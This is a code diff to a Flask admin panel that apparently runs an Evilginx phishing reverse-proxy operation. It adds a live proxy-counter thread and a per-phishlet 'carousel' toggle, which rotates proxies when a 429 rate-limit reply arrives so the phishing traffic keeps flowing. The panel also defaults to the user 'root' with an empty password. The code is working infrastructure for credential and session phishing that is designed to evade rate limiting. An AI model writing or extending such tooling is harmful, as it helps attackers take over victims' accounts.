@@ -42,7 +42,7 @@ PANEL_HOST = os.environ.get("PANEL_HOST", "0.0.0.0")
 PANEL_PORT = int(os.environ.get("PANEL_PORT", "8443"))
 PANEL_USER = os.environ.get("PANEL_USER", "root")
 PANEL_PASS = os.environ.get("PANEL_PASS", "")
-PANEL_VERSION = "3.4.0"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
+PANEL_VERSION = "3.5.0"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
 
 # ═══════════════════════════════════════════════════════════════════════════════
 #  FLASK SETUP
@@ -1149,6 +1149,25 @@ def _session_live_loop():
         except Exception:
             time.sleep(2)
 
+
+def _proxy_live_loop():
+    """Push Proxy page counters from RAM. Max 1 emit/s. Never talks to Evilginx or Linode."""
+    prev = ""
+    while True:
+        try:
+            time.sleep(1)
+            snap = pxe.live_snapshot()
+            fp = pxe.live_fingerprint(snap)
+            if fp == prev:
+                continue
+            prev = fp
+            try:
+                socketio.emit("proxy_live", snap)
+            except Exception:
+                pass
+        except Exception:
+            time.sleep(2)
+
 @app.route("/api/notifications", methods=["GET", "POST"])
 @auth
 def api_notifications():
@@ -2158,6 +2177,23 @@ def api_proxy_detach():
     return jsonify(ok=True, **st)
 
 
+@app.route("/api/proxy/carousel", methods=["POST"])
+@auth
+def api_proxy_carousel():
+    data = request.get_json(force=True) or {}
+    ph = data.get("phishlet") or ""
+    if not ph or not re.match(r"^[a-zA-Z0-9_\-]+$", ph):
+        return jsonify(error="invalid phishlet")
+    enabled = bool(data.get("enabled"))
+    st = pxe.set_carousel(ph, enabled)
+    nc_push(
+        "Proxy carousel",
+        f"{ph}: carousel {'on — 429 rotates the queue, no detach' if enabled else 'off — 429 will detach the current hop'}.",
+        "info",
+    )
+    return jsonify(ok=True, **st)
+
+
 @app.route("/api/proxy/repair", methods=["POST"])
 @auth
 def api_proxy_repair():
@@ -2221,6 +2257,8 @@ _notif_thread = _thr.Thread(target=_notif_monitor_loop, daemon=True)
 _notif_thread.start()
 _live_thread = _thr.Thread(target=_session_live_loop, daemon=True)
 _live_thread.start()
+_px_live_thread = _thr.Thread(target=_proxy_live_loop, daemon=True)
+_px_live_thread.start()
 
 if __name__ == "__main__":
     egm.start()
